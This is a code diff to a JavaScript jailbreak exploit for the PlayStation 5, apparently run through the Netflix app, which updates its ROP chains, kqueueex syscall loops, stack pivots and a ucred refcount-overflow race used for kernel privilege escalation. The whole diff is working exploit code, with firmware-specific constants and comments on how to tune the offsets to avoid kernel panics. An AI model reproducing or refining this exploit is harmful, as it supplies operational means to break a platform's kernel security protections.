@@ -153,7 +153,7 @@
     }
 
     try {
-        const p2jb_version = "P2JB 2.6 (Y2JB -> NFJB port by wodz69)";
+        const p2jb_version = "NF-P2JB v0.95";
 
         const PAGE_SIZE = 0x4000;
 
@@ -168,6 +168,7 @@
 
         const RTP_SET = 1n;
         const PRI_REALTIME = 2n;
+        const PRI_LOW = 200n;
 
         const F_SETFL = 4n;
         const O_NONBLOCK = 4n;
@@ -193,10 +194,8 @@
         const MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
 
-        const LEAK_CORES = [0, 1, 2, 3];
-        const LEAK_SYSCALLS = 0x100000001n;
-        const LEAK_FD_MAX = 8192n
-        const LEAK_SYSCALLS_FINAL = 0xFEDn;
+        const LEAK_UCRED_REF_FLOOR_ESTIMATE = 108n; // NF v6.000.000 PS5 (Disc-FAT) FW 11.20, no disc in the drive
+        const LEAK_UCRED_REF_OFFSET = 30n; // increase in increments of 10 if JB fails with "stage0: race failed after 96 attempts"; decrease if it KPs before reaching stage0
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -265,7 +264,6 @@
         };
 
         function ensure_kernel_offset() {
-
             let key = FW_VERSION;
             if (FW_ALIAS_P2JB[key]) key = FW_ALIAS_P2JB[key];
             let fw = FW_OFFSETS_P2JB[key];
@@ -319,8 +317,9 @@
         }
 
         let ROP = {
-            get pop_rsp()             { return g.get('pop_rsp');               },
             get pop_rax()             { return g.get('pop_rax');               },
+            get pop_rsp()             { return g.get('pop_rsp');               },
+            get pop_rsp_pop_rbp()     { return g.get('pop_rsp_pop_rbp');       },
             get pop_rdi()             { return g.get('pop_rdi');               },
             get pop_rsi()             { return g.get('pop_rsi');               },
             get pop_rdx()             { return g.get('pop_rdx');               },
@@ -334,6 +333,8 @@
         let saved_mxcsr = 0;
 
         let failcheck_path = null;
+
+        let LEAK_CORES = [0, 1, 2, 3];
 
         function my_init_threading() {
             const jmpbuf = malloc(0x60);
@@ -399,9 +400,13 @@
 
             let idx = 0;
             const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
-            // at() converts a slot index to its in-memory address.
-            // Only called in repairSlot (~20k times), not in the emit hot path.
             const at = (i) => entry + BigInt(i * 8);
+
+            const repairSlot = (slotIdx, value) => {
+                emit(ROP.pop_rdi); emit(at(slotIdx));
+                emit(ROP.pop_rax); emit(value);
+                emit(ROP.mov_qword_rdi_rax);
+            };
 
             emit(ROP.ret);
             emit(ROP.ret);
@@ -421,15 +426,14 @@
             emit(ROP.pop_rdx); emit(rt_prio);
             emit(syscall_wrapper);
             emit(ROP.ret);
-            const LOOP_START = idx;
 
-            const readBase = idx;
-            emit(ROP.pop_rax); emit(SYSCALL.read);
-            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
-            emit(ROP.pop_rsi); emit(dummybuf);
-            emit(ROP.pop_rdx); emit(1n);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
+            for (let k = 0; k < remainder; k++) {
+                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
+                emit(ROP.pop_rdi); emit(POC_ARG);
+                emit(syscall_wrapper);
+                emit(ROP.ret);
+            }
+            const LOOP_START = idx;
 
             const kqBase = [];
             for (let k = 0; k < unroll; k++) {
@@ -438,30 +442,20 @@
                 emit(ROP.pop_rdi); emit(POC_ARG);
                 emit(syscall_wrapper);
                 emit(ROP.ret);
+
+                // only [b+2, b+4] get clobbered and need a repair
+                repairSlot(kqBase[k] + 2, ROP.pop_rdi);
+                repairSlot(kqBase[k] + 3, POC_ARG);
+                repairSlot(kqBase[k] + 4, syscall_wrapper);
             }
 
-            const repairSlot = (slotIdx, value) => {
-                emit(ROP.pop_rdi); emit(at(slotIdx));
-                emit(ROP.pop_rax); emit(value);
-                emit(ROP.mov_qword_rdi_rax);
-            };
-            repairSlot(readBase + 0, ROP.pop_rax);
-            repairSlot(readBase + 1, SYSCALL.read);
-            repairSlot(readBase + 2, ROP.pop_rdi);
-            repairSlot(readBase + 3, BigInt(pipe_rfd));
-            repairSlot(readBase + 4, ROP.pop_rsi);
-            repairSlot(readBase + 5, dummybuf);
-            repairSlot(readBase + 6, ROP.pop_rdx);
-            repairSlot(readBase + 7, 1n);
-            repairSlot(readBase + 8, syscall_wrapper);
-            for (let k = 0; k < unroll; k++) {
-                const b = kqBase[k];
-                repairSlot(b + 0, ROP.pop_rax);
-                repairSlot(b + 1, SYSCALL.kqueueex);
-                repairSlot(b + 2, ROP.pop_rdi);
-                repairSlot(b + 3, POC_ARG);
-                repairSlot(b + 4, syscall_wrapper);
-            }
+            emit(ROP.pop_rax); emit(SYSCALL.read);
+            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
+            emit(ROP.pop_rsi); emit(dummybuf);
+            emit(ROP.pop_rdx); emit(1n);
+            emit(syscall_wrapper);
+            emit(ROP.ret);
+            // no slots clobbered by SYSCALL.read, no need for repairing slots
 
             emit(ROP.pop_rax); emit(1n);
             emit(ROP.pop_rdi); emit(finished_addr);
@@ -472,12 +466,6 @@
 
             if (idx % 2 !== 0) emit(ROP.ret);
             const EXIT = idx;
-            for (let k = 0; k < remainder; k++) {
-                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
-                emit(ROP.pop_rdi); emit(POC_ARG);
-                emit(syscall_wrapper);
-                emit(ROP.ret);
-            }
             emit(ROP.pop_rax); emit(EXIT_MARK);
             emit(ROP.pop_rdi); emit(finished_addr);
             emit(ROP.mov_qword_rdi_rax);
@@ -485,64 +473,7 @@
             emit(ROP.pop_rdi); emit(0n);
             emit(syscall_wrapper);
 
-            return { buf, entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
-        }
-
-        function build_kqueueex_final_chain(count, core, finished_addr, rt_prio) {
-            const POC_ARG = 0x800000000000n;
-            const STACK_SIZE = 0x4000 + (Number(count) * 6 + 256) * 8;
-
-            const buf = malloc(STACK_SIZE);
-            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
-            const chain_view = new BigUint64Array(chain_ab);
-            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
-            chain_view.fill(0n, 0, 0x800);
-
-            const entry = buf + 0x4000n;
-            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts
-
-            const mask = malloc(0x10);
-            write64_uncompressed(mask + 0x0n, 1n << BigInt(core));
-            write64_uncompressed(mask + 0x8n, 0n);
-
-            let idx = 0;
-            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
-
-            emit(ROP.ret);
-            emit(ROP.ret);
-
-            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
-            emit(ROP.pop_rdi); emit(3n);
-            emit(ROP.pop_rsi); emit(1n);
-            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
-            emit(ROP.pop_rcx); emit(0x10n);
-            emit(ROP.pop_r8); emit(mask);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
-
-            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
-            emit(ROP.pop_rdi); emit(RTP_SET);
-            emit(ROP.pop_rsi); emit(0n);
-            emit(ROP.pop_rdx); emit(rt_prio);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
-
-            for (let k = 0; k < Number(count); k++) {
-                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
-                emit(ROP.pop_rdi); emit(POC_ARG);
-                emit(syscall_wrapper);
-                emit(ROP.ret);
-            }
-
-            emit(ROP.pop_rax); emit(1n);
-            emit(ROP.pop_rdi); emit(finished_addr);
-            emit(ROP.mov_qword_rdi_rax);
-
-            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
-            emit(ROP.pop_rdi); emit(0n);
-            emit(syscall_wrapper);
-
-            return entry;
+            return { buf, entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT), view: chain_view };
         }
 
         function fail(msg) { throw new Error("p2jb: " + msg); }
@@ -657,10 +588,13 @@
         }
 
         function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
-            const STACK_SIZE = 0x10000;
+            const STACK_SIZE = 0x4000 + 0xA00 * 8;
             const buf = malloc(STACK_SIZE);
-            for (let k = 0n; k < 0x4000n; k += 8n) write64_uncompressed(buf + k, 0n);
+            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
+            const chain_view = new BigUint64Array(chain_ab);
+            chain_view.fill(0n, 0, 0x800);
             const entry = buf + 0x4000n;
+            const ENTRY_START = 0x800;
 
             const cmd_addr = ws.cmd;
             const awake_addr = ws.awake + BigInt(wid * 8);
@@ -668,7 +602,7 @@
             const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;
 
             let idx = 0;
-            const emit = (v) => { write64_uncompressed(entry + BigInt(idx * 8), v); idx++; };
+            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
             const at = (i) => entry + BigInt(i * 8);
 
             emit(ROP.ret);
@@ -768,6 +702,7 @@
                 wait_val_slot,
                 pivotAddr: at(pivotSlotIdx),
                 exitAddr: at(EXIT_START),
+                view: chain_view
             };
         }
 
@@ -1013,6 +948,7 @@
             if (failcheck_path) {
                 try { write_file(failcheck_path, ""); } catch (_) { }
             }
+            logger.log("prepare_fds");
 
             const rl = malloc(16);
             syscall(0xC2n, 8n, rl);
@@ -1021,29 +957,14 @@
             write64_uncompressed(rl + 8n, nofile_hard);
             syscall(SYSCALL.setrlimit, 8n, rl);
 
-            const cand = ["/dev/null", "/dev/", "/", "/app0/", "/dev/urandom",
-                "/dev/notification0", "/dev/gc"];
-            let held_path = 0n;
-            let held_path_str = 0n;
-            for (let c = 0; c < cand.length; c++) {
-                const sp = alloc_string(cand[c]);
-                const a = syscall(SYSCALL.open, sp, O_RDONLY);
-                if (a === 0xffffffffffffffffn) continue;
-                const b = syscall(SYSCALL.open, sp, 0n);
-                syscall(SYSCALL.close, a);
-                if (b === 0xffffffffffffffffn) continue;
-                syscall(SYSCALL.close, b);
-                held_path = sp;
-                held_path_str = cand[c];
-                break;
-            }
+            const sp_dev_null = alloc_string("/dev/null");
+            const new_free_fd = () => syscall(SYSCALL.open, sp_dev_null, O_RDONLY);
 
-            const new_free_fd = () => held_path !== 0n
-                ? syscall(SYSCALL.open, held_path, O_RDONLY)
-                : syscall(SYSCALL.socket, 28n, 2n, 0n);
+            const FD_BUDGET_MAX = 2048;
+            const FD_BUDGET_RES = 10; // safety margin in case fd(s) were somehow opened before null_fd creation
 
             const probe_fds = [];
-            for (let i = 0; i < LEAK_FD_MAX; i++) {
+            for (let i = 0; i < FD_BUDGET_MAX; i++) {
                 const pfd = new_free_fd();
                 if (pfd === 0xffffffffffffffffn) break;
                 probe_fds.push(pfd);
@@ -1052,36 +973,47 @@
             for (let i = 0; i < probe_fds.length; i++)
                 syscall(SYSCALL.close, BigInt(probe_fds[i]));
 
-            let free_fds_num = fd_budget - 96;
-            if (free_fds_num > 2048) free_fds_num = 2048;
+            let free_fds_num = fd_budget - FD_BUDGET_RES;
 
-            const R_ESTIMATE = 69 + 12 + 1 + 1;
-            const BURST_MIN = R_ESTIMATE + 40;
-            if (free_fds_num < BURST_MIN)
-                fail("fd budget too small: free_fds_num=" + free_fds_num +
-                    " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
-                    BURST_MIN + "); fd_budget=" + fd_budget);
+            const NW = BigInt(LEAK_CORES.length);
 
-            logger.log("prepare_fds: free_fd_path=" + held_path_str + " fd_budget=" + fd_budget);
+            const LEAK_UCRED_R_DYN_ESTIMATE = NW + 1n + 1n; // leak worker pipes now created before SYSCALL.setuid so should not interfere with the victim ucred
+            const LEAK_NULL_FD_MARGIN = 40n;
+            const LEAK_NULL_FD_BURST_MIN = LEAK_UCRED_REF_FLOOR_ESTIMATE + LEAK_UCRED_R_DYN_ESTIMATE + LEAK_NULL_FD_MARGIN;
 
-            syscall(SYSCALL.setuid, 1n);
+            if (free_fds_num < LEAK_NULL_FD_BURST_MIN)
+                fail("fd budget too small: free_fds_num=" + free_fds_num + " must exceed R~" + LEAK_UCRED_R_ESTIMATE + " with margin (need >=" + LEAK_NULL_FD_BURST_MIN + "); fd_budget=" + fd_budget);
 
-            nanosleep_ms(10000);
-
-            const TOTAL_SYSCALLS = LEAK_SYSCALLS - LEAK_SYSCALLS_FINAL - BigInt(free_fds_num);
+            const LEAK_KQUEUEEX_SYSCALLS = 0x100000001n - BigInt(free_fds_num) - LEAK_UCRED_REF_FLOOR_ESTIMATE + LEAK_UCRED_REF_OFFSET; // ucred refcount overflow should not occur before leak workers are done to avoid KP on thr exit/fd close
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            const LEAK_UNROLL = 512;
-            const U = BigInt(LEAK_UNROLL);
-
-            const NW = LEAK_CORES.length;
             const FEED_CHUNK = 4096;
 
             const chunkbuf = malloc(FEED_CHUNK);
 
-            const base_share = TOTAL_SYSCALLS / BigInt(NW);
-            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
+            const base_share = LEAK_KQUEUEEX_SYSCALLS / NW;
+            const cross_worker_rem = LEAK_KQUEUEEX_SYSCALLS - base_share * NW;
+
+            const base_share_num = Number(base_share);
+            let best_leak_unroll = 512;
+            let r0 = base_share_num % 512;
+            let best_rem = base_share_num % 512;
+            for (let u = 513; u <= 1024; u++) {
+                const r = base_share_num % u;
+                if (r < best_rem) {
+                    best_rem = r;
+                    best_leak_unroll = u;
+                    if (r === 0) break;
+                }
+            }
+
+            const U = BigInt(best_leak_unroll);
+            const target_w = (base_share / U) * U;
+            const leak_remainder = Number(LEAK_KQUEUEEX_SYSCALLS - target_w * NW);
+
+            logger.log("prepare_fds: LEAK_KQUEUEEX_SYSCALLS=" + toHex(LEAK_KQUEUEEX_SYSCALLS) + " best_leak_unroll=" + best_leak_unroll + " target_w=" + target_w + " leak_remainder=" + leak_remainder + " fd_budget=" + fd_budget + " free_fds_num=" + free_fds_num);
+
             const lws = [];
 
             const rt_prio = malloc(4);
@@ -1089,33 +1021,37 @@
             write16_uncompressed(rt_prio + 2n, 256n);
 
             for (let w = 0; w < NW; w++) {
-                const target_w = base_share + (w === 0 ? extra0 : 0n);
-                const bplus1_w = target_w / U;
-                const normal_w = bplus1_w - 1n;
-                const remainder_w = target_w - bplus1_w * U;
+                const normal_w = target_w / U - 1n; // leak_worker_chain is "do-while" style
+                const rem_w = w === 0 ? leak_remainder : 0;
                 const [pr, pw] = create_pipe();
                 const rfd = Number(pr), wfd = Number(pw);
 
                 syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
                 const finished = malloc(8); write64_uncompressed(finished, 0n);
                 const dummybuf = malloc(8);
-                const chain = build_leak_worker_chain(
-                    LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
-                    Number(remainder_w), rt_prio);
-                spawn_leak_worker(chain.entry);
+                logger.log("prepare_fds: worker " + w + " target_w=" + target_w + " normal_w=" + normal_w + " rem_w=" + rem_w);
+                const chain = build_leak_worker_chain( LEAK_CORES[w], rfd, finished, dummybuf, best_leak_unroll, rem_w, rt_prio);
                 lws.push({
                     chain, rfd, wfd, wfd_big: BigInt(wfd),
                     rfd_big: BigInt(rfd), finished,
                     normal: normal_w, queued: 0n
                 });
             }
-            const final_chain_done_ptr = malloc(8);
-            const final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr, rt_prio);
 
             const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
             const _sleep_ts = malloc(16);
             write64_uncompressed(_sleep_ts,      5n);           // tv_sec  = 5
             write64_uncompressed(_sleep_ts + 8n, 0n);           // tv_nsec = 0
+
+            const _fionread_buf = malloc(4);
+
+            logger.log("prepare_fds: LEAK start");
+            syscall(SYSCALL.setuid, 1n); // proc create victim ucred; don't move any fd creation other than null_fds below this line
+            nanosleep_ms(5000);
+
+            for (const lw of lws) {
+                spawn_leak_worker(lw.chain.entry);
+            }
 
             _cr_enable_caching();
 
@@ -1140,61 +1076,70 @@
 
             logger.log("feeding done, waiting for workers to finish");
 
-            for (const lw of lws) {
-                write64_uncompressed(lw.finished, 0n);
-            }
-            while (true) {
-                nanosleep_ms(3000);
-                let all_idle = true;
+            let all_drained = false;
+            while (!all_drained) {
+                nanosleep_ms(1000);
+                all_drained = true;
                 for (const lw of lws) {
-                    if (read64_uncompressed(lw.finished) !== 0n) {
-                        all_idle = false;
-                        write64_uncompressed(lw.finished, 0n);
+                    syscall(SYSCALL.ioctl, lw.rfd_big, 0x4004667fn, _fionread_buf);
+                    const qdepth = Number(read32_uncompressed(_fionread_buf));
+                    if (qdepth > 0) {
+                        all_drained = false;
+                        break;
                     }
                 }
-                if (all_idle) break;
             }
-            logger.log("all workers idle, updating pivot");
-            for (const lw of lws) {
+            logger.log("all worker queues drained");
+
+            for (let i = 0; i < lws.length; i++) {
+                logger.log("pivoting worker " + i + " to exit");
+                nanosleep_ms(100);
+                const lw = lws[i];
                 write64_uncompressed(lw.chain.pivotAddr, lw.chain.exitAddr);
                 write64_uncompressed(lw.finished, 0n);
                 syscall(SYSCALL.write, lw.wfd_big, chunkbuf, 1n);
-            }
-            for (let i = 0; i < lws.length; i++) {
-                const lw = lws[i];
+
                 const dl = Date.now() + 15000;
-                while (read64_uncompressed(lw.finished) !== EXIT_MARK && Date.now() < dl)
+                while (true) {
+                    let mark = read64_uncompressed(lw.finished);
+                    logger.log("worker " + i + " mark " + toHex(mark));
+                    if (mark === EXIT_MARK || Date.now() > dl) break;
                     nanosleep_ms(500);
+                }
                 if (read64_uncompressed(lw.finished) !== EXIT_MARK) {
                     logger.log("worker " + i + " timeout waiting for EXIT_MARK");
                 }
+
+                logger.log("worker " + i + " finalized");
+            }
+
+            for (let i = 0; i < lws.length; i++) {
+                const lw = lws[i];
+                logger.log("closing worker pipe " + i);
+                nanosleep_ms(100);
+                // safe to close, pipe ucred is pointing to the non victim instance
                 syscall(SYSCALL.close, lw.rfd_big);
                 syscall(SYSCALL.close, lw.wfd_big);
             }
+            logger.log("worker pipes closed");
+            nanosleep_ms(5000);
 
-            logger.log("launching kqueueex_final_chain...");
-            write64_uncompressed(final_chain_done_ptr, 0n);
-            spawn_leak_worker(final_chain_entry);
-            logger.log("Waiting for kqueueex_final_chain to complete...");
-            while (read64_uncompressed(final_chain_done_ptr) === 0n) {
-                nanosleep_ms(500);
-            }
-
-            logger.log("kqueueex_final_chain finished successfully. preparing free-fd");
+            logger.log("preparing free-fds count=" + free_fds_num);
+            // start ucred refcount overflow danger zone: uncontrolled ucred un-ref (thread/fd close) can cause ucred delete and KP
             for (let i = 0; i < free_fds_num; i++) {
                 const fd = new_free_fd();
                 if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                 S.free_fds.push(Number(fd));
             }
+            // end ucred refcount overflow danger zone: ucred refcount should be > 0
+
+            syscall(SYSCALL.setuid, 1n); // proc vacate victim ucred, don't move any fd creation other than null_fds above this line
 
             logger.log("prepare_fds complete, stage 0 in 10s");
-
-            syscall(SYSCALL.setuid, 1n);
             nanosleep_ms(10000);
         }
 
         function free_one_fd(S) {
-
             if (S.free_fd_idx >= S.free_fds.length)
                 fail("free_one_fd: free_fds pool exhausted (idx=" +
                     S.free_fd_idx + "/" + S.free_fds.length + ")");
@@ -2108,8 +2053,8 @@
         }
 
         function post_jb_kill_self(S) {
-            logger.log("killing Netflix app, bye now...");
-            send_notification("killing Netflix app, bye now...");
+            logger.log("Thank you for using Netflix'N'Hack " + p2jb_version + ", bye now...");
+            send_notification("Thank you for using Netflix'N'Hack " + p2jb_version + ", bye now...");
             nanosleep_ms(500);
             const pid = syscall(SYSCALL.getpid);
             syscall(SYSCALL.kill, pid, 9n);
@@ -2132,6 +2077,10 @@
         } catch (_) { failcheck_path = null; }
 
         logger.log(p2jb_version +" FW: " + FW_VERSION);
+
+        // if (compare_version(FW_VERSION, "12.0") >= 0) {
+        //     LEAK_CORES = [0, 1];
+        // }
 
         ensure_kernel_offset();
 
@@ -2160,7 +2109,7 @@
             case 1: eta_minutes = 120; break;
             case 2: eta_minutes = 70; break;
             case 3: eta_minutes = 60; break;
-            case 4: eta_minutes = 50; break;
+            case 4: eta_minutes = 45; break;
             default: eta_minutes = Math.round(48 * 4 / leak_nw); break;
         }
         const eta_str =  eta_minutes + " min";
